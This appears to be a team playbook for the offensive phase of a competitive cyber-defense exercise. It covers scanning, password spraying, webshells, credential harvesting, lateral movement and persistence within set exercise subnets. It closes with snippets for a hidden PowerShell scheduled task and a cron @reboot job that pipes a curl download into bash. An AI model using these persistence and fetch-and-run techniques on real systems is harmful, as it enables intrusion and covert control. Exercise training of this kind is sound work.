🔵 Phase Two Workflow — Blue vs. Blue (Offense)
1. Rules & Constraints
Targets: Only other Blue Teams’ subnets (100.80.0.0/21, per team ranges).

Prohibited: No DoS, no rendering hosts unusable, no deleting OS files, no firewall lockouts.

Scoring: Maintain your own services and beacon from compromised hosts to Scorebot.

Spirit: Live off the land, minimize footprint, preserve uptime.

2. Reconnaissance
Network discovery

bash
nmap -sV -Pn 100.80.X.0/23
Focus on scored services (HTTP, DNS, SMB, RDP, SSH).

Web app mapping

Use curl, wget, or Burp to enumerate endpoints.

Look for login portals, file uploads, debug pages.

Service enumeration

SMB: smbclient -L //target -N

RDP: xfreerdp /u:user /p:pass /v:target

SSH: ssh user@target

3. Initial Access
Credential attacks

Reuse captured NTLMv2/NTLM hashes (from Responder).

Spray common passwords against SSH/RDP/SMB.

Web app exploitation

Test for auth bypass, LFI, RFI, SQLi, file upload → webshell.

Abuse legitimate features (template injection, debug endpoints).

Living off the land

Windows: wmic, powershell, schtasks, regsvr32.

Linux: ssh, cron, systemd-run, bash.

4. Post‑Exploitation
Credential harvesting

Windows: cmdkey /list, dump saved creds.

Linux: check /etc/shadow (if readable), config files, SSH keys.

Lateral movement

Windows: Enter-PSSession, Invoke-Command, schtasks.

Linux: SSH with reused creds, pivot via shared keys.

Privilege escalation

Windows: weak service permissions, unquoted paths.

Linux: sudo misconfigs, SUID binaries, cron jobs.

5. Persistence
Windows

Scheduled task with PowerShell one‑liner beacon.

Registry run keys (user‑level).

Linux

Add SSH key to ~/.ssh/authorized_keys.

Cron @reboot job calling existing binaries.

6. Beaconing & Scoring
Deploy beacon to Scorebot from compromised host.

Use allowed egress (80/443/53/25).

Keep services functional — test after beacon deployment.

7. Hygiene & Documentation
Do not delete logs — only clean your artifacts (temp files, uploaded shells).

Document everything: host, creds, method, persistence, beacon status.

Time management: rotate operators, avoid rabbit holes.

8. Priorities & Time Allocation
First 30 min: Recon, service mapping, quick wins (default creds, weak passwords).

Next 60–90 min: Web app exploitation, credential reuse, initial shells.

Next 60–90 min: Lateral movement, persistence, beacon deployment.

Final stretch: Maintain uptime, clean artifacts, document for hotwash.

9. LOTL Command Snippets
Windows

powershell
schtasks /Create /SC ONCE /TN "Update" /TR "powershell -w hidden -c '...' " /ST 23:59
Linux

bash
echo "@reboot /usr/bin/curl http://100.80.X.Y/beacon.sh | bash" | crontab -
✅ Phase Two Mindset
Stealth over noise: blend with admin traffic.

Service uptime first: don’t break scored services.

Document for hotwash: every action is a learning point.

Outrun the other Blue Teams: you don’t need perfection, just better resilience and offense.
